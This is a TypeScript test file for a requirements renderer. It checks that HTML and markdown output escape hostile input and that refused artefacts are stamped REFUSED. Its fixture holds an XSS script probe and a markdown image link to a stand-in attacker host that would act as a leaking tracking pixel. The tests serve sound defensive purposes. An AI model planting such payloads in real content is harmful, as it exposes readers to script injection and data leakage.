import { describe, expect, it } from "vitest";
import { renderHtml, renderMarkdown } from "../reqs/render.js";
import type { Finding, ReqsBody } from "../reqs/schema.js";
import { clone, minimalBody } from "./helpers/reqs-fixture.js";

/**
 * One string carrying every metacharacter a hostile source document, quote,
 * or question could smuggle in: an HTML tag, an ampersand, a quote, a
 * backtick, a pipe (which corrupts the markdown grounding table if left raw),
 * and markdown's link and image syntax — a grounding quote is copied verbatim
 * out of an ingested page, so `![](http://…)` left live is a tracking pixel
 * that fires on whoever opens the projection.
 */
const PAYLOAD = `<script>alert(1)</script> A & B "quoted" \` | pipe ![pwn](https://attacker.example/p.png?leak=1) [click](https://attacker.example/)`;

function poisonedBody(): ReqsBody {
  const at = "2026-07-30T00:00:00.000Z";
  const b = clone(minimalBody());
  b.metadata.title = PAYLOAD;
  b.tree.statement = PAYLOAD;
  b.tree.acceptanceCriteria![0]!.given = PAYLOAD;
  b.tree.acceptanceCriteria![0]!.when = PAYLOAD;
  // biome-ignore lint/suspicious/noThenProperty: Gherkin given/when/then field, required verbatim
  b.tree.acceptanceCriteria![0]!.then = [PAYLOAD];
  b.tree.grounding = [
    {
      source: "confluence",
      docId: "confluence:page:ptrd-2",
      title: PAYLOAD,
      quote: PAYLOAD,
      retrievedAt: at,
      hedged: false,
    },
  ];
  b.clarifications = [
    {
      id: "CL-1",
      nodeId: "REQ-ROOT",
      question: PAYLOAD,
      options: [],
      grounding: [],
    },
  ];
  b.residuals = [
    {
      id: "RU-1",
      kind: "ResidualRisk",
      nodeId: "REQ-ROOT",
      statement: PAYLOAD,
      acceptedBy: { kind: "human", name: "Jane Doe" },
      acceptedAt: at,
    },
  ];
  return b;
}

/** Count of `|` characters not preceded by a backslash — real table delimiters. */
function unescapedPipeCount(line: string): number {
  return (line.match(/(?<!\\)\|/g) ?? []).length;
}

describe("renderHtml escapes authored content", () => {
  const html = renderHtml(poisonedBody());

  it("never contains a raw <script> tag", () => {
    expect(html).not.toContain("<script>alert(1)</script>");
    expect(html).toContain("&lt;script&gt;alert(1)&lt;/script&gt;");
  });

  it("escapes ampersand and quote everywhere the payload lands", () => {
    // metadata title, node statement, AC given/when/then, grounding quote/title,
    // clarification question, residual statement all carry the same payload.
    const occurrences = html.split("A &amp; B &quot;quoted&quot;").length - 1;
    expect(occurrences).toBeGreaterThanOrEqual(7);
    expect(html).not.toContain(`A & B "quoted"`);
  });
});

describe("renderMarkdown escapes authored content", () => {
  const md = renderMarkdown(poisonedBody());

  it("never contains a raw <script> tag, in any of the payload's landing spots", () => {
    expect(md).not.toContain("<script>alert(1)</script>");
    // metadata title, node statement, AC given/when/then, grounding quote/title,
    // clarification question, residual statement. The parens of `alert(1)` are
    // themselves escaped now — link syntax is structure, and structure here is
    // never authored — so the inert form carries backslashes.
    const occurrences = md.split("&lt;script&gt;alert\\(1\\)&lt;/script&gt;").length - 1;
    expect(occurrences).toBeGreaterThanOrEqual(7);
  });

  it("escapes backticks so a quote cannot break out into a code span", () => {
    expect(md).not.toMatch(/[^\\]`(?!`)/); // no bare, unescaped backtick survives
    expect(md).toContain("\\`");
  });

  it("escapes pipes so a quote cannot corrupt table structure", () => {
    const groundingSection = md.split("## Grounding")[1]!.split("## Clarification ledger")[0]!;
    const lines = groundingSection
      .trim()
      .split("\n")
      .filter((l) => l.trim().length > 0);
    // header, separator, one data row
    expect(lines).toHaveLength(3);
    const [header, separator, dataRow] = lines as [string, string, string];
    const headerCols = unescapedPipeCount(header);
    expect(unescapedPipeCount(separator)).toBe(headerCols);
    expect(unescapedPipeCount(dataRow)).toBe(headerCols);
    expect(dataRow).toContain("\\|");
  });

  it("escapes link and image syntax so a source quote cannot become a tracking pixel", () => {
    // The whole payload lands in a grounding quote, which is verbatim source text.
    expect(md).not.toContain("![pwn](https://attacker.example/p.png?leak=1)");
    expect(md).not.toContain("[click](https://attacker.example/)");
    // Nothing that a markdown renderer would read as a link or image destination:
    // every bracket and paren in the projection is backslash-escaped.
    expect(md).not.toMatch(/(?<!\\)!\[/);
    expect(md).not.toMatch(/(?<!\\)\]\s*\(/);
    expect(md).toContain("\\!\\[pwn\\]\\(https://attacker.example/p.png?leak=1\\)");
  });

  it("is a pure projection — same body in, same string out", () => {
    const b = poisonedBody();
    expect(renderMarkdown(b)).toBe(renderMarkdown(clone(b)));
  });
});

/**
 * `render --markdown` is offered two lines from the claim that a refused
 * artefact is stamped REFUSED. It has to be true of the FILE, not of a console
 * line that does not travel with it — a markdown projection of a refused
 * artefact must not be indistinguishable from a passed one.
 */
describe("renderMarkdown stamps a refused artefact", () => {
  const error: Finding = {
    id: "GATE-006",
    severity: "error",
    path: "signoff.approvers.0.kind",
    message: "an agent may never approve a requirement set",
  };
  const warning: Finding = {
    id: "TRACE-004",
    severity: "warning",
    path: "REQ-ROOT",
    message: "a leaf with a single acceptance criterion is thin",
  };

  it("carries the refusal, naming each error's id, path and message", () => {
    const md = renderMarkdown(minimalBody(), [error]);
    expect(md).toContain("REFUSED");
    expect(md).toContain("GATE-006");
    expect(md).toContain("signoff.approvers.0.kind");
    expect(md).toContain("an agent may never approve a requirement set");
    // a leading blockquote, before the document's own title
    expect(md.startsWith("> ")).toBe(true);
    expect(md.indexOf("REFUSED")).toBeLessThan(md.indexOf("# PTR-401"));
  });

  it("does not stamp an artefact whose findings are only warnings", () => {
    const md = renderMarkdown(minimalBody(), [warning]);
    expect(md).not.toContain("REFUSED");
    expect(md).not.toContain("TRACE-004");
    expect(md.startsWith("# PTR-401")).toBe(true);
  });

  it("does not stamp an artefact with no findings at all", () => {
    expect(renderMarkdown(minimalBody())).toBe(renderMarkdown(minimalBody(), []));
    expect(renderMarkdown(minimalBody())).not.toContain("REFUSED");
  });
});
